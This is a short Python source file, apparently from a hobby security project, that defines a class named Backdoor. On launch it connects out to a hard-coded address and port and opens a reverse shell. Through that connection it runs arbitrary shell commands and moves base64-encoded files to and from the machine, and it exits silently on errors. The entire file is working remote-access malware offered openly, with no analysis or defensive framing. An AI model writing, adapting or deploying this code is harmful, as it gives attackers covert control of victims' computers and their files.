#  Copyright (c) 2019. Ciphyr
#  Email: ciphyr[at]protonmail.com
#
#  Licensed under the Apache License, Version 2.0 (the "License");
#  You may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#  http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an "AS IS" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.

import socket, subprocess, json, os, base64, sys

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def json_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def json_receive(self):
        json_data = ''
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def change_directory(self, path):
        os.chdir(path)
        return '[+] Changing directory to ' + path

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return '[+] Upload Successful.'

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def execute_sys_comand(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def run(self):
        while True:
            command = self.json_receive()
            try:
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit()
                elif command[0] == 'cd' and len(command) > 1:
                    command_result = self.change_directory(command[1])
                elif command[0] == 'download' and len(command) > 1:
                    command_result = self.read_file(command[1])
                elif command[0] == 'upload' and len(command) > 1:
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_sys_comand(command)
            except Exception:
                command_result = '[-] Error during command execution.'

            self.json_send(command_result)


try:
    my_backdoor = Backdoor('192.168.100.242', 8080)
    my_backdoor.run()
except Exception:
    sys.exit()
